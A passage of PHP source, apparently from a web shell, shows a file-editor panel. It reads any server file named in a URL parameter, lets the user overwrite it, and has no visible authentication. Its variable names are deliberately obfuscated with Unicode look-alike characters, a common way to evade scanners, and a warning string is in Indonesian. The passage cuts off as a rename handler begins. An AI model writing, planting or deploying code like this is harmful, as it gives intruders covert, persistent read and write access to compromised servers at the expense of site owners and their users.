<?php if (isset($_GET['tool']) && $_GET['tool'] === 'edit' && isset($_GET['item']) && is_file($_GET['item'])): 
    $ﬓ̤̂̀̅̈ = $_GET['item'];
    $㌁̨ﬆ̧ = @filesize($ﬓ̤̂̀̅̈);
    $ᚦ̄ᛃ̥̈̃̉ = @file_get_contents($ﬓ̤̂̀̅̈);
?>
    <div class="box">
        <h3>✏️ Editor: <?=htmlspecialchars(basename($ﬓ̤̂̀̅̈))?> <span class="dim">(<?=hs($㌁̨ﬆ̧)?>)</span></h3>
        <?php if ($ﾚ̀ᚢᛈᛏ̣́): ?>
            <div class="<?=$ﾚ̀ᚢᛈᛏ̣́[0] === 'ok' ? 'ok-c' : 'err-c'?>" style="margin:8px 0"><?=$ﾚ̀ᚢᛈᛏ̣́[0] === 'ok' ? '✓' : '✗'?> <?=htmlspecialchars($ﾚ̀ᚢᛈᛏ̣́[1])?></div>
        <?php endif; ?>
        <form method="POST" style="margin-top:10px">
            <textarea name="save_content" id="editor" autofocus><?=htmlspecialchars($ᚦ̄ᛃ̥̈̃̉)?></textarea>
            <div style="margin-top:12px;display:flex;gap:10px;flex-wrap:wrap;align-items:center">
                <button class="btn" type="submit">💾 Save</button>
                <a href="?path=<?=urlencode($㉁ぁ̆)?>" class="btn btn-gray">Cancel</a>
                <span class="dim">Size: <b id="size-live"><?=number_format($㌁̨ﬆ̧)?></b> bytes</span>
            </div>
        </form>
    </div>
    <script>
    var ed = document.getElementById('editor');
    var szLive = document.getElementById('size-live');
    var origSize = <?=$㌁̨ﬆ̧?>;
    ed.addEventListener('input', function(){
        var sz = new Blob([ed.value]).size;
        szLive.textContent = sz.toLocaleString();
        szLive.style.color = (sz === 0 && origSize > 0) ? '#ef5350' : (sz !== origSize ? '#ffb74d' : '#81c784');
    });
    ed.addEventListener('keydown', function(e){
        if ((e.ctrlKey || e.metaKey) && e.key === 's') {
            e.preventDefault();
            if (new Blob([ed.value]).size === 0 && origSize > 0) {
                if (!confirm('⚠ WARNING: File akan jadi 0KB. Yakin?')) return;
            }
            ed.form.submit();
        }
    });
    </script>
<?php endif; ?>

<?php if (isset($_GET['rename']) && (is_file($_GET['rename']) || is_dir($_GET['rename']))): ?>
